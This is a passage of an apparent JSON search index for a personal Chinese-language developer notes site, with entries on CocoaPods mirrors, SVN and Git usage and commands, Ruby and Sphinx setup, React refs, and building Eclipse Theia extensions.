https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git master 最后进入自己的工程，在自己工程的podFile第一行加上： source 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git' 克隆镜像有点慢, 我这花了9分半 Mac默认缓存位置是在: /Users/用户名/.cocoapods/repos 应该是pod转了一遍网络的原因, 导致github没有走clash的代理, 全局代理也无效; 只能手动配置一下了: git config --global http.https://github.com.proxy socks5://127.0.0.1:60742 还没试, 后面试试. 附, 恢复: git config --global --unset http.proxy 复制代码 git config --global --unset http.https://github.com.proxy 复制代码 使用 命令行方式: pod init 或者手动创建 Podfile : source 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git' platform :osx, '14.0' use_frameworks! target 'CQ' do pod 'KeyboardShortcuts', '~> 1.16.1' end 第一行指定源 后续安装直接: pod install 即可 注解 这里用的 KeyboardShortcuts 发现pod上面版本只有 0.7.1 , 太低了, 放弃 重要 使用pod的项目, 一定要使用 项目名.xcworkspace 打开, 才是 pod 的配置, 否则找不到pod安装的模块","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Package-management-tool-pod.html","loc":"/yq-doc-source-docs-rear-end-swift-Package-management-tool-pod.html"},{"title":"swift","text":"官网: https://www.swift.org 官网API文档: https://developer.apple.com/documentation/technologies 官网教程只有英文 一个用于在Apple设备上开发的语言 现在基本是 Object-C 后的接替了 安装 Mac上直接安装Xcode就行了, 自带Swift. 其他平台可参考: https://www.swift.org/install/ Swift内置了一个包管理, 能够更简单的导入, 包索引查询: https://swiftpackageindex.com 一些网站 民间(NGO, Non-Governmental Organization)中文社区: https://swiftgg.team 民间Swift语法中文版(相对更新慢一点): https://gitbook.swiftgg.team/swift/ 民间Swift 基本约定译文: https://github.com/SketchK/the-swift-api-design-guidelines-in-chinese 注解 swift 坑比较多, 资料也比较少... 打算做一个快捷键的, 东西太少 找到个可以借鉴的项目: git clone https://github.com/tkgka/Switcher.git git地址: https://github.com/tkgka/Switcher 注解 国内NGO就是社会组织 访问C头文件的几种方式 备注 对于MacOS 要使App全局显示, 只有设置 Info 为 Application is agent (UIElement) , 比如显示在其他全屏App上. 这是用其他语言暂时无法实现的... 单独的 Swift-View 如果要作为一个弹出窗体, 需要转换为 NSWindow 对于单独的 NSWindow , 直接给 delegate 会存在问题... 有个一直未解决的问题, 本地构建的App, 重新构建后, 识别不了上个版本获取的权限, 比如辅助功能...","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-index.html","loc":"/yq-doc-source-docs-rear-end-swift-index.html"},{"title":"SVN","text":"安装: apt install subversion 配置 其实不需要怎么配置， 遇到的问题是普通用户每次都需要输入密码 修改: # ~/.subversion/config # 允许明码记住密码 password-stores = simple # 也可以在这里设置选项 # ~/.subversion/servers store-plaintest-passwords # 解压到指定路径 这个时候是 $svn_path 下的所有文件 在 $local_path下面 svn checkout $svn_path $local_path # 先进去再解压 这个时候是svn地址 当前文件开始命名 cd $local_path && svn checkout $svn_path # 更新 cd $local_path svn update 关于错误：svn \"cannot set LC_CTYPE locale\"的问题 解决: # 修改/etc/profile # 加入 export LC_ALL=C # 然后在终端执行： source /etc/profile 毛用没有， 这样弄才解决的: sudo dpkg-reconfigure locales 重新安装了一下语言为en_US.UTF-8 看了一下 /etc/default/locale的内容，变成了: LC_CTYPE=\"en_US.UTF-8\" LC_ALL=\"en_US.UTF-8\" LANG=\"en_US.UTF-8\" （之前设置的环境为中文，所以可能脚本不兼容我这个系统） 后面有时间看看这几个变量的区别 参考链接： https://askubuntu.com/questions/599808/cannot-set-lc-ctype-to-default-locale-no-such-file-or-directory 关于冲突的问题 使用 svn cleanup 无效 然后删除了重新checkout的 svn blame 查看具体的每一行代码的变更信息","tags":"版本控制","url":"/yq-doc-source-docs-version-control-SVN-index.html","loc":"/yq-doc-source-docs-version-control-SVN-index.html"},{"title":"SVN与Git的区别","text":"参考: svn与git的区别（总结） 版本控制器的作用 可以协同代码管理，让多人开发代码得以实现。 回归到以前的任何一个时间点的代码处 （好比：开始写了很多代码，后面有修改了一些，突然IDE崩溃，但是发现还是以前的代码更好， 这个时候无法回去，这个时候没有后悔药吃，但是可以使用版本备份，但是即花费空间和花费时间）。 由于上面的版本备份造成版本众多，难于找到正确的版本（SVN有专门的日志记录了文件的每一次修改，可以通过查看日志回到任何一个自己想要的版本）。 代码冲突的问题，主要是多人操作同一个文件（团队开发很常见）。 可以查看每个人具体的操作，便于出现问题后及时排查（由于某个员工个人失误造成很大的bug，可以方便的追究责任）。 常见的版本控制器分类 CVS（90年代开发，版本控制器的鼻祖） SVN（CVS的接班人） VSS（微软产品） GIT（李纳斯开发） SVN SVN：代码控制器（版本控制器），主要是为了多人协同开发项目， 管理代码。也可以管理个人代码。也叫程序界的\"后悔药\"。 SVN（是subversion的简称）是近年来一款基于C/S架构的，非常优秀的版本控制器（可以简单的理解为管理代码的工具，在多人协同开发的时候，尤其重要）， 与传统的CVS（90年代左右，一个非常优秀的代码管理器，是代码管理器的鼻祖）管理工具类似。 SVN可以随着时间的推移来管理各种数据，这些数据被放置在一个SVN管理的中央仓库（所有的代码的集合）里面。 同时SVN会备份并记录每个文件每一次的修改更新变动。 这样就开发者就可以回归到任何一个时间点的某一个旧的版本（对于SVN，没修改一次文件，SVN就会创建一个叫做版本的概念，是从0 开始自增的序列）。 当然也可以指定文件的更新历史记录（index.php）。 SVN又叫做集中式版本控制器。严重的依赖服务器端，当服务器端无法使用的时候，版本控制也就无法再使用了。 GIT Git是目前世界上最先进的分布式版本控制系统（没有之一）。 当这个系统的任何一个客户端出现问题的时候，都可以从另外的客户端（即使服务器挂了）获取所有的代码。 SVN与GIT的区别 GIT是分布式的，而SVN是集中式的 GIT把内容按元数据方式存储，而SVN是按文件：因为git目录是处于个人机器上的一个克隆版的版本库，它拥有中心版本库上所有的东西，例如标签，分支，版本记录等。 GIT分支和SVN的分支不同：svn会发生分支遗漏的情况，而git可以同一个工作目录下快速的在几个分支间切换，很容易发现未被合并的分支，简单而快捷的合并这些文件。 GIT没有一个全局的版本号，而SVN有 GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。 集中式和分布式的区别 集中式版本控制系统：版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑， 所以要先从中央服务器取得最新的版本，然后开始干活，干完活了， 再把自己的活推送给中央服务器。集中式版本控制系统最大的毛病就是必须联网才能工作。 分布式版本控制系统：分布式版本控制系统根本没有\"中央服务器\"，每个人的电脑上都是一个完整的版本库， 这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。 比方说你在自己电脑上改了文件A，你的同事也在他的电脑上改了文件A， 这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。 为了方便\"交换\"大家的修改，分布式版本控制系统通常也有一台充当\"中央服务器\"的电脑，但没有它大家也一样干活，只是交换修改不方便而已。 分布式版本控制系统的安全性要高很多，因为每个人电脑里都有完整的版本库， 某一个人的电脑坏掉了不要紧，随便从其他人那里复制一个就可以了。 而集中式版本控制系统的中央服务器要是出了问题，所有人都没法干活了。 参考: https://blog.csdn.net/qq_40143330/article/details/79816024 常用命令 Git vs SVN Git 和 SVN 孰优孰好，每个人有不同的体验。 Git是分布式的，SVN是集中式的 这是 Git 和 SVN 最大的区别。若能掌握这个概念，两者区别基本搞懂大半。 因为 Git 是分布式的，所以 Git 支持离线工作，在本地可以进行很多操作， 包括接下来将要重磅推出的分支功能。而 SVN 必须联网才能正常工作。 Git复杂概念多，SVN简单易上手 所有同时掌握 Git 和 SVN 的开发者都必须承认，Git 的命令实在太多了， 日常工作需要掌握 add , commit , status , fetch , push , rebase`等， 若要熟练掌握，还必须掌握 `rebase 和 merge 的区别， fetch 和 pull 的区别等，除此之外，还有 cherry-pick , submodule , stash 等功能，仅是这些名词听着都很绕。 在易用性这方面，SVN 会好得多，简单易上手，对新手很友好。 但是从另外一方面看，Git 命令多意味着功能多，若我们能掌握大部分 Git 的功能， 体会到其中的奥妙，会发现再也回不去 SVN 的时代了。 Git分支廉价，SVN分支昂贵 在版本管理里，分支是很常使用的功能。 在发布版本前，需要发布分支，进行大需求开发，需要 feature 分支， 大团队还会有开发分支，稳定分支等。在大团队开发过程中，常常存在创建分支，切换分支的需求。 Git 分支是指针指向某次提交，而 SVN 分支是拷贝的目录。这个特性使 Git 的分支切换非常迅速，且创建成本非常低。 而且 Git 有本地分支，SVN 无本地分支。 在实际开发过程中，经常会遇到有些代码没写完，但是需紧急处理其他问题， 若我们使用 Git，便可以创建本地分支存储没写完的代码，待问题处理完后，再回到本地分支继续完成代码。 Git 核心概念 Git 最核心的一个概念就是工作流。 工作区(Workspace)是电脑中实际的目录。 暂存区(Index)类似于缓存区域，临时保存你的改动。 仓库区(Repository)，分为本地仓库和远程仓库。 从 SVN 切换到 Git，最难理解并且最不能理解的是暂存区和本地仓库。熟练使用 Git 后，会发现这简直是神设计，由于这两者的存在，使许多工作变得易管理。 通常提交代码分为几步： git add 从工作区提交到暂存区 git commit 从暂存区提交到本地仓库 git push 或 git svn dcommit 从本地仓库提交到远程仓库 Git-SVN常用命令 本节命令针对使用 Git-SVN 的开发者，请务必掌握。 若服务器使用的 SVN，但是本地想要体验 Git 的本地分支，离线操作等功能，可以使用 Git-SVN 功能。 常用操作: # 下载一个 SVN 项目和它的整个代码历史，并初始化为 Git 代码库 $ git svn clone -s [repository] # 查看当前版本库情况 $ git svn info # 取回远程仓库所有分支的变化 $ git svn fetch # 取回远程仓库当前分支的变化，并与本地分支变基合并 $ git svn rebase # 上传当前分支的本地仓库到远程仓库 $ git svn dcommit # 拉取新分支，并提交到远程仓库 $ svn copy [remote_branch] [new_remote_branch] -m [message] # 创建远程分支对应的本地分支 $ git checkout -b [local_branch] [remote_branch] 初始化 从本节开始，除特殊说明，以下命令均适用于 Git 与 Git-SVN : # 在当前目录新建一个Git代码库 $ git init # 下载一个项目和它的整个代码历史 [Git only] $ git clone [url] 配置 列举所有配置: $ git config -l 为命令配置别名: $ git config --global alias.co checkout $ git config --global alias.ci commit $ git config --global alias.st status $ git config --global alias.br branch 设置提交代码时的用户信息: $ git config [--global] user.name \"[name]\" $ git config [--global] user.email \"[email address]\" Git 用户的配置文件位于 ~/.gitconfig Git 单个仓库的配置文件位于 ~/$PROJECT_PATH/.git/config 增删文件 添加当前目录的所有文件到暂存区: $ git add . 添加指定文件到暂存区: $ git add <file1> <file2> ... 添加指定目录到暂存区，包括其子目录: $ git add <dir> 删除工作区文件，并且将这次删除放入暂存区: $ git rm [file1] [file2] ... 停止追踪指定文件，但该文件会保留在工作区: $ git rm --cached [file] 改名文件，并且将这个改名放入暂存区: $ git mv [file-original] [file-renamed] 把文件名 file1 添加到 .gitignore 文件里，Git 会停止跟踪 file1 的状态。 分支 列出所有本地分支: $ git branch 列出所有本地分支和远程分支: $ git branch -a 新建一个分支，但依然停留在当前分支: $ git branch [branch-name] 新建一个分支，并切换到该分支: $ git checkout -b [new_branch] [remote-branch] 切换到指定分支，并更新工作区: $ git checkout [branch-name] 合并指定分支到当前分支: $ git merge [branch] 选择一个 commit，合并进当前分支: $ git cherry-pick [commit] 删除本地分支，-D 参数强制删除分支: $ git branch -d [branch-name] 删除远程分支: $ git push [remote] :[remote-branch] 提交 提交暂存区到仓库区: $ git commit -m [message] 提交工作区与暂存区的变化直接到仓库区: $ git commit -a 提交时显示所有 diff 信息: $ git commit -v 提交暂存区修改到仓库区，合并到上次修改，并修改上次的提交信息: $ git commit --amend -m [message] 上传本地指定分支到远程仓库: $ git push [remote] [remote-branch] 拉取 下载远程仓库的所有变动 (Git only): $ git fetch [remote] 显示所有远程仓库 (Git only): $ git remote -v 显示某个远程仓库的信息 (Git only): $ git remote show [remote] 增加一个新的远程仓库，并命名 (Git only): $ git remote add [remote-name] [url] 取回远程仓库的变化，并与本地分支合并，(Git only), 若使用 Git-SVN，请查看第三节: $ git pull [remote] [branch] 取回远程仓库的变化，并与本地分支变基合并，(Git only), 若使用 Git-SVN，请查看第三节: $ git pull --rebase [remote] [branch] 撤销 恢复暂存区的指定文件到工作区: $ git checkout [file] 恢复暂存区当前目录的所有文件到工作区: $ git checkout . 恢复工作区到指定 commit: $ git checkout [commit] 重置暂存区的指定文件，与上一次 commit 保持一致，但工作区不变: $ git reset [file] 重置暂存区与工作区，与上一次 commit 保持一致: $ git reset --hard 重置当前分支的指针为指定 commit，同时重置暂存区，但工作区不变: $ git reset [commit] 重置当前分支的HEAD为指定 commit，同时重置暂存区和工作区，与指定 commit 一致: $ git reset --hard [commit] 新建一个 commit，用于撤销指定 commit: $ git revert [commit] 将未提交的变化放在储藏区: $ git stash 将储藏区的内容恢复到当前工作区: $ git stash pop 查询 查看工作区文件修改状态: $ git status 查看工作区文件修改具体内容: $ git diff [file] 查看暂存区文件修改内容: $ git diff --cached [file] 查看版本库修改记录: $ git log 查看某人提交记录: $ git log --author=someone 查看某个文件的历史具体修改内容: $ git log -p [file] 查看某次提交具体修改内容: $ git show [commit]","tags":"版本控制","url":"/yq-doc-source-docs-version-control-The-difference-between-SVN-and-git.html","loc":"/yq-doc-source-docs-version-control-The-difference-between-SVN-and-git.html"},{"title":"指令","text":"","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-Command-index.html","loc":"/yq-doc-source-docs-version-control-git-Command-index.html"},{"title":"git 命令","text":"如何表示版本号联系 可以使用 版本号~num 表示. 比如有一个hash的版本号: 1109duw1 , 前一个版本可以表示为: 1109duw1~1 , 前第二个版本: 1109duw1~2","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-git-command.html","loc":"/yq-doc-source-docs-version-control-git-git-command.html"},{"title":"Git","text":"","tags":"版本控制","url":"/yq-doc-source-docs-version-control-git-index.html","loc":"/yq-doc-source-docs-version-control-git-index.html"},{"title":"toctree通配符失效","text":"toctree有一个glob属性, 需要指定才可以使用通配符: .. toctree:: :glob: xxx/* 官文原文说明: You can use \"globbing\" in toctree directives, by giving the glob flag option. All entries are then matched against the list of available documents, and matches are inserted into the list alphabetically. Example: .. toctree:: :glob: intro* recipe/* * 使用此属性, 将匹配, 按结果字母顺序列出.","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-question-TOCTREE-generals-failed.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-TOCTREE-generals-failed.html"},{"title":"便捷启动服务","text":"直接访问构建出的HTML源码不方便, 可以启动一个本地HTTP服务: sphinx-autobuild source build/html 注解 需要先安装: pip install sphinx-autobuild -i https://mirrors.aliyun.com/pypi/simple 参考: /docs/后端/python/python三方库/sphinx-autobuild","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-question-Convenient-start--up-service.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Convenient-start--up-service.html"},{"title":"DDD","text":"对DDD的理解 最开始的MVC只是抽象出一个Model实体, 做ORM; 业务复杂度堆积在Service层, 将Service的业务实现抽象为一个通用的 \"领域对象\"(可以理解为一个特殊的Model), 就叫DDD","tags":"后端","url":"/yq-doc-source-docs-rear-end-java-DDD.html","loc":"/yq-doc-source-docs-rear-end-java-DDD.html"},{"title":"sphinx-autobuild","text":"一个直接将 Sphinx 项目启动在本地的指令 安装: pip install sphinx-autobuild -i https://mirrors.aliyun.com/pypi/simple 启动: sphinx-autobuild source build/html","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-sphinx-autobuild.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-sphinx-autobuild.html"},{"title":"Ruby","text":"安装配置 安装: brew install ruby 配置: ### # ruby ### # export PATH=\"/usr/local/opt/ruby/bin:$PATH\" # compilers to find ruby export LDFLAGS=\"-L/usr/local/opt/ruby/lib\" export CPPFLAGS=\"-I/usr/local/opt/ruby/include\" # pkg-config to find ruby export PKG_CONFIG_PATH=\"/usr/local/opt/ruby/lib/pkgconfig\" 写到 ~/.zshrc 配置源: # 查看当前源 gem source -l # 移除 gem source --remove https://rubygems.org/ # 添加国内镜像 gem source -a https://gems.ruby-china.com/","tags":"后端","url":"/yq-doc-source-docs-rear-end-ruby-index.html","loc":"/yq-doc-source-docs-rear-end-ruby-index.html"},{"title":"useRef","text":"仅支持函数组件. 与 /docs/前端/框架/react/hooks/createRef 使用基本一致, 区别在于: createRef 每次渲染都会返回一个新的引用，而 useRef 每次都会返回相同的引用。 官方文档内容: useRef 返回一个可变的 ref 对象，其 .current 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的整个生命周期内保持不变。 换句话说, 在 函数组件中 , 当触发重新渲染时, 使用 createRef 声明的变量, 会先销毁(变量重置为null), 然后再重新赋值 ( 在类组件中效果是正常的hook ) 使用 useRef 声明的变量, 第一次声明后就一直存在. useRef 适用于函数组件中需要在多次渲染之间保持引用的情况. 参考:: 什么是 useRef , useRef 与 createRef 区别, 以及在什么情况下使用 useRef 精读《useRef 与 createRef 的区别》 useRef、createRef的区别及使用，及useRef妙用","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-hooks-useref.html","loc":"/yq-doc-source-docs-front-end-frame-react-hooks-useref.html"},{"title":"调用自定义子函数组件属性","text":"关键字:: React 父组件调用子组件 父组件调用子函数组件 父组件调用自定义子函数组件 见 /docs/前端/框架/react/hooks/useImperativeHandle 的 React-Hook_给非DOM函数组件增加ref属性 /docs/前端/框架/react/hooks/forwardRef /docs/前端/框架/react/hooks/useImperativeHandle","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-question-Call-the-custom-sub--function-component-attribute.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-Call-the-custom-sub--function-component-attribute.html"},{"title":"函数组件无ref属性","text":"函数组件默认没有ref属性, .. 需要使用forwardRef来传递ref: 需要使用 forwardRef 包装: const PSelect00 = (props: any, ref) => { return ( <div ref={ref}>p0</div> ) } const PSelect0 = React.forwardRef((props, ref) => { return ( <PSelect00 ref={ref}>p0</PSelect00> ) }) const PSelect1 = () => { const refP0 = React.useRef() return <PSelect0 ref={refP0}/> } 还有就是暴露自定义组件实例, 自定义暴露内容, 见 /docs/前端/框架/react/hooks/forwardRef /docs/前端/框架/react/hooks/useImperativeHandle","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-question-Functional-component-no-REF-attribute.html","loc":"/yq-doc-source-docs-front-end-frame-react-question-Functional-component-no-REF-attribute.html"},{"title":"关于vscode的语言服务器","text":"主要是与插件相关的吧. vscode为了解决以下问题: 语言服务器若要同时兼容所有语言, 太过臃肿 浪费资源 与编辑器标准不一致, 导致每个语言的服务器都要适配一种编辑器 所有制定了语言服务器标准协议LSP(Language Server Protocol), 保证了 每一种语言服务器都能适配所有遵照此LSP标准的编辑器 相关github地址: https://github.com/Microsoft/vscode-languageserver-node 原文介绍: https://code.visualstudio.com/api/language-extensions/language-server-extension-guide#why-language-server 实现自定义的语言服务器 主要两个方面: 语言服务器客户端: 需要实现vscode的相应api 语言服务器服务端: 实际的语法分析(单独的进程)","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-About-VSCode's-language-server.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-About-VSCode's-language-server.html"},{"title":"theia源码之user-storage","text":"注解 此文基于 @theia 版本 1.43.1 此篇幅涉及到的是theia配置相关 比如 theia 默认的配置目录为: {家目录}/.theia 默认配置-EnvVariablesServerImpl 默认的环境配置为 EnvVariablesServerImpl , 源码位置: @theia/core/src/node/env-variables/env-variables-server.ts 源码很简单, 这里只说下它做了什么: 实例化时候就配置 configDirUri , 优先将 process.env.THEIA_CONFIG_DIR (即环境变量THEIA_CONFIG_DIR) 设置为配置根目录; 若不存在, 再将 join(homedir(), '.theia') 设置为配置根; 或者说设置为 configDirUri 其他就是将系统传入的环境变量解析下, 可以通过 getVariables() 获取 等... user-storage映射 如果你有跟过theia首选项保存的断点, 很容易就发现, 保存时候使用的 uri 为: user-storage:/user/settings.json 这实际上是一个抽象的虚拟映射路径, 映射关系定义在 UserStorageContribution , 位置: @theia/userstorage/src/browser/user-storage-contribution.ts 它通过 默认配置-EnvVariablesServerImpl 提供的 configDirUri 来定义映射关系, 比如: user-storage:/user/settings.json 的默认本地磁盘位置为: {homedir}/.theia/settings.json createProvider 是具体的实现(只截取关键部分): uriConverter: { to: resource => { const relativePath = UserStorageUri.relative(resource); if (relativePath) { return configDirUri.resolve(relativePath).normalizePath(); } return undefined; }, from: resource => { const relativePath = configDirUri.relative(resource); if (relativePath) { return UserStorageUri.resolve(relativePath); } return undefined; } } 完","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Theia-source-code--User-Storage.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Theia-source-code--User-Storage.html"},{"title":"关于theia的绑定","text":"自定义拓展可见 /docs/前端/框架/theia/问题/创建自定义拓展 一般来说, 自定义拓展都需要在package.json声明入口文件: \"theiaExtensions\": [ \"hello-world/lib/browser/hello-world-frontend-module\" ] 入口文件内一般都是相应的绑定: import { ContainerModule } from '@theia/core/shared/inversify'; export default new ContainerModule( (bind, unbind, isBound, rebind, unbindAsync, onActivation, onDeactivation) => { // add your contribution bindings here bind(CommandContribution).to(HelloWorldCommandContribution); bind(MenuContribution).to(HelloWorldMenuContribution); }); 这里介绍一下 bind, unbind, rebind. rebind 此前所有相应的绑定皆失效, 但是作用范围保留(如单例) unbind 取消此前所有的响应绑定及作用范围 bind 绑定贡献点, 服务等 bind(A).toSelf() 对象即自己, 每次使用都是一个新的对象 bind(A).toSelf().inSingleScope() 单例的绑定自己 bind(A).toService(B): 注入A时, 实际是类B的对象, 类B的对象需要提前bind","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-About-Theia-binding.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-About-Theia-binding.html"},{"title":"在theia的react-dialog上新增自定义dialog","text":"使用开发者工具可以看出, theia内置的react-dialog是先覆盖了一层 z-index 为 5000 的 div : 注解 这里的 react-dialog 即: import {ReactDialog} from \"@theia/core/lib/browser/dialogs/react-dialog\"; 如果要在其上再弹出一个dialog, 要么, 减小原有的这个 5000; 要么, 增大需要增加的 z-index","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Added-custom-dialog-on-the-Dialog-of-Theia.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Added-custom-dialog-on-the-Dialog-of-Theia.html"},{"title":"内置一些外部插件","text":"可以去插件商店搜索获取插件下载地址: https://open-vsx.org 然后补充到 package.json 中, 比如我搜了c的语法分析的插件clang, 那么直接在 theiaPlugins 补充即可(这里名称好像没有强制要求): \"theiaPlugins\": { \"vscode-clangd\": \"https://open-vsx.org/api/llvm-vs-code-extensions/vscode-clangd/0.1.24/file/llvm-vs-code-extensions.vscode-clangd-0.1.24.vsix\" } 效果就是内置了这个插件, 不会在启动后的插件商店显示; 在插件商店搜索的结果是未安装; 在插件商店搜索后点击安装, 会下载, 但是安装时检查到已经内置, 就不会触发解包安装, 然后显示已安装(来自Ai的解释) 注解 这里补充一下, 实际上最核心语法分析等功能依赖的的是相应 语言服务器 的插件 试过, 只有语言服务器, 不包含 @theia/languages 也可以正常代码跳转. 另外, 如果你新加入一个插件, 且已经下载这个插件的部分东西, 但是插件有问题, 这个时候一般会伴随出现编译构建启动报错等等. 此时不仅要删除在 package.json 增加的插件配置, 还需要删除 plugins 里相应的下载内容. 原因嘛, 启动的时候, 会加载 plugins 下的所有内容","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Built--in-external-plug--in.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Built--in-external-plug--in.html"},{"title":"取消异步操作","text":"theia提供了 CancellationTokenSource 来支持取消异步操作 使用 导包: import {CancellationTokenSource} from '@theia/core/lib/common' 创建一个可以传递的 CancellationToken 对象: const cts = new CancellationTokenSource(); const token = cts.token; 在外部调用 cancel() 方法来通知已取消: cts.cancel(); 在异步操作内部监听 token 的信号来处理取消逻辑: doAsyncWork(token).then(...).catch(...); if (token.isCancellationRequested) { // 进行取消操作 } 注解 外部调用 cts.cancel(); 时, 将会将 token.isCancellationRequested 设置为 true","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Cancel-asynchronous-operation.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Cancel-asynchronous-operation.html"},{"title":"完全关闭Theia应用","text":"对用使用Electron的后端, 旧版本支持直接调用 app.quit 退出, 新版本编译的程序不暴露app, 所以无法使用此方法. 待续...","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Completely-close-the-THEIA-application.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Completely-close-the-THEIA-application.html"},{"title":"组件的状态渲染","text":"Theia 虽然有使用 react , 不过却是自己另外封装的控件, 比较典型的就是 \"@theia/core/src/browser/widgets/react-widgets\" 定义的 ReactWidget . 与普通的 react 类组件不同, theia不存在自动刷新控件状态这种概念, 如果其中变量有更新, 需要手动调用 this,update() 来触发UI渲染的更新; 但是站在编码角度考虑, 如果每一个变量的更新都调用一次 this,update() 重渲染, 是一个没必要的开销. 一般建议是将与UI相关的状态统一放到一个位置, 统一更新, 如: wStates = { state1: '', state2: '', ... } updateDataOfUi(newData) { this.wStates = newData this.update() } 一般对于这种更新是将 props 传递给子组件手动触发子组件更新.","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Component-status-rendering.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Component-status-rendering.html"},{"title":"控件状态保存与恢复","text":"一般都是实现 StatefulWidget 的 storeState 与 restoreState , 包位置: import {StatefulWidget} from \"@theia/core/lib/browser\"; 大致例子: class Example implements StatefulWidget{ storeState(): object { const argsExample = {his: this.history, name: this.name} return {argsExample} } restoreState(oldState: object): void { const lastArgs = oldState['argsExample'] || {} // do restore from these args this.restore(lastArgs) } restore(lastArgs){ // do restore from these args } } 这样每次重新打开的时候, 就可以触发相应的恢复 注解 只有theia正常关闭的时候, 状态才会被正常记录","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-question-Control-status-preservation-and-recovery.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Control-status-preservation-and-recovery.html"},{"title":"创建自定义拓展","text":"这部分官方文档也有说明: https://theia-ide.org/docs/authoring_extensions/ 大致流程如下 安装生成器: npm install -g yo generator-theia-extension 创建拓展目录: mkdir -p src/@ide/theia-hello-world-extension 进创建的目录, 生成相关代码(这里启动生成器的时候有很多选项, 比如控件, 实际使用选需要的即可): cd src/@ide/theia-hello-world-extension yo theia-extension # 这里教程选择 'Hello World' 选项(这里默认) 生成后在当前目录生成的 package.json 配置文件入口: \"theiaExtensions\": [ { \"frontend\": \"lib/browser/hello-world-frontend-module\" } ] theiaExtensions 里定义的模块就是绑定了theia贡献点的依赖注入的内容(相当于特殊的入口文件) 这里暂时只定义 frontend 贡献点, 有需要还可以定义后端的 backend 使用的依赖注入是 InversifyJS 模块提供的 ContainerModule , 生成内容如下(目录: hello-world/lib/browser/hello-world-frontend-module ): /** * Generated using theia-extension-generator */ import { HelloWorldCommandContribution, HelloWorldMenuContribution } from './hello-world-contribution'; import { CommandContribution, MenuContribution } from '@theia/core/lib/common'; import { ContainerModule } from '@theia/core/shared/inversify'; export default new ContainerModule(bind => { // add your contribution bindings here bind(CommandContribution).to(HelloWorldCommandContribution); bind(MenuContribution).to(HelloWorldMenuContribution); }); 相应的package.json配置大致如下: { \"name\": \"@ide/hello-world-extension\", \"keywords\": [ \"theia-extension\" ], \"version\": \"0.1.0\", \"files\": [ \"hello-world/lib\", \"hello-world/src\" ], \"theiaExtensions\": [ { \"frontend\": \"hello-world/lib/browser/hello-world-frontend-module\" } ], \"dependencies\": { \"@theia/core\": \"latest\" }, \"private\": true, \"engines\": { \"yarn\": \">=1.7.0 <2\", \"node\": \">=14.18.0\" }, \"scripts\": { \"clean\": \"rimraf lib\", \"build\": \"tsc\", \"build:browser\": \"yarn --cwd browser-app bundle\", \"build:electron\": \"yarn --cwd electron-app bundle\", \"prepare\": \"lerna run prepare\", \"postinstall\": \"theia check:theia-version\", \"start:browser\": \"yarn --cwd browser-app start\", \"start:electron\": \"yarn --cwd electron-app start\", \"watch\": \"lerna run --parallel watch\" }, \"devDependencies\": { \"rimraf\": \"latest\", \"typescript\": \"latest\", \"lerna\": \"2.4.0\" }, \"workspaces\": [ \"hello-world\", \"browser-app\", \"electron-app\" ] } 这里生成的位置是在 hello-world 下, 后面有需要可以重新布局一下目录, 当然还有tsconfig配置. 代码可以参考 hello-world/src 下的ts源码. 接下来就是将此拓展放进ide了, 在主项目的 package.json 的依赖中增加如下内容: \"private\": true, \"dependencies\": { \"@ide/hello-world-extension\": \"0.1.0\" } \"workspaces\": [ \"src/@ide/*\" ], 说明: 在依赖里配置上面自己的拓展, \"@ide/hello-world-extension\" 就是在自定义拓展的 package.json 定义的 name 由于是自定义拓展, 放在本地目录, 非镜像仓库的npm包, 所以需要设置 workspaces , 才能正常识别本地模块并编译到 node_module 下面去 只有设置了 private 才可以使用 workspaces 然后 yarn install 即可. 按照上面的我这里启动的时候找不到模块 vscode-ws-jsonrpc , 然后去根目录装了一个(可能需要加-W): yarn add vscode-ws-jsonrpc --save 注意版本, 发现虽然我的 theia/languages 是最新新版: \"@theia/languages\": \"latest\" 但是依赖的 vscode-ws-jsonrpc 是 0.2.0 , 可现在(2023.09.14) 2.x.x 都有了: \"vscode-ws-jsonrpc\": \"&#94;0.2.0\" 注解 没问题 如果想开放的话, 也可以 yarn push 